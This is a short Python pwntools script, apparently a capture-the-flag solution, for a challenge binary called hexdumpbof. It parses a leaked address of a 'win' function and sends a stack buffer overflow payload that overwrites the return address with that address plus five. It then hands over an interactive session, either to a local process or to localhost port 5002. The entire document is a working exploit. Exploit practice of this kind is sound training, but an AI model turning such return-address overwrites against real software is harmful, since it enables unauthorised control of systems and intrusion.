from pwn import *

if args.REMOTE:
    p = remote('localhost', 5002)
else:
    p = process('./dist/hexdumpbof.o')

p.recvuntil("function at ")
win = int(p.recvuntil(" (win)", drop=True), 16)

success(f"win = {hex(win)}")

p.sendlineafter('Input:', flat({0x20: p64(0x8), 0x28: p64(win + 5)}))
p.sendlineafter("Go again? (Y/N)", "N")
p.interactive()